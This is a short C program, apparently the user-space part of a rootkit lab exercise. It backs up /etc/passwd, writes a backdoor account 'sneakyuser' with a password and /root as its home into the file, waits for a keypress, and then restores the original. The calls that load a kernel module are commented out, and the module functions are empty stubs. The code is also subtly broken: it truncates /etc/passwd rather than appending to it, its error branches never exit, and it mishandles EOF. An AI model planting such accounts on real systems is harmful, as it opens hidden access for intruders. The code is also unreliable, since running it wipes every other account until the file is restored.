#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void copy_file(char * srcName, char * dstName) {
  FILE * srcFile = fopen(srcName, "r");
  if (srcFile == NULL) {
    printf("Cannot open file %s \n", srcName);
    EXIT_FAILURE;
  }
  FILE * dstFile = fopen(dstName, "w");
  if (dstFile == NULL) {
    printf("Cannot open file %s \n", dstName);
    EXIT_FAILURE;
  }

  char c = fgetc(srcFile);
  while (c != EOF) {
    fputc(c, dstFile);
    c = fgetc(srcFile);
  }
  fclose(srcFile);
  fclose(dstFile);
}

void add_passwd(char * fileName, char * passwd) {
  FILE * file = fopen(fileName, "w");
  if (file == NULL) {
    printf("Cannot open file %s \n", fileName);
    EXIT_FAILURE;
  }
  fprintf(file, "%s", passwd);
  fclose(file);
}

void load_sneaky_mod() {
}
void loop_interact() {
}
void unload_sneaky_mod() {
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());

  copy_file("/etc/passwd", "/tmp/passwd");
  add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  //  system("insmod sneaky_mod.ko");

  char c;
  while ((c = getchar()) != 'q') {
  }

  // system("rmmod sneaky_mod.ko");
  copy_file("/tmp/passwd", "/etc/passwd");
  return EXIT_SUCCESS;
}
